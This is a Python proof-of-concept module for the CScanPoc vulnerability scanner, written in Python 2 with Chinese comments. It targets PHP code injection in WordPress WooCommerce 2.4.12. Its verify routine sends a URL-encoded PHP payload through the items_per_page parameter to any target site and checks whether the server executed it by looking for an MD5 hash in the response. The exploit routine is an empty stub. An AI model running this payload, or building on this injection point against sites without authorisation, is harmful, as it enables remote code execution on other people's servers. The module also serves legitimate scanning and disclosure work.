# coding: utf-8

from CScanPoc.thirdparty import requests,hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import re
hh = hackhttp.hackhttp()

class Vuln(ABVuln):
    poc_id = '7475dc9c-f10a-4e90-96ec-1e0be0fe5549'
    name = 'WordPress WooCommerce 2.4.12 PHP Code Injection' # 漏洞名称
    level = VulnLevel.HIGH # 漏洞危害级别
    type = VulnType.RCE # 漏洞类型
    disclosure_date = '2015-10-20'  # 漏洞公布时间
    desc = '''
        WordPress WooCommerce 2.4.12 PHP Code Injection
    ''' # 漏洞描述
    ref = 'https://packetstormsecurity.com/files/135000/WordPress-WooCommerce-2.4.12-PHP-Code-Injection.html' # 漏洞来源
    cnvd_id = 'Unkonwn' # cnvd漏洞编号
    cve_id = 'Unkonwn' #cve编号
    product = 'WordPress'  # 漏洞应用名称
    product_version = 'WordPress WooCommerce 2.4.12'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'f46f1241-7cd8-499f-8586-30a4536c8c98'
    author = '国光'  # POC编写者
    create_date = '2018-05-25' # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            arg = '{target}'.format(target=self.target)
            payload = '/produits/?items_per_page=%24%7b%40print(md5(balabala))%7d&setListingType=grid'
            verify_url = arg + payload
            code, head, res, errcode, _ = hh.http(verify_url)
            if code == 200 and '4fd952b7a28daf93be5457b4318554a1' in res:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        super(Poc, self).exploit()


if __name__ == '__main__':
    Poc().run()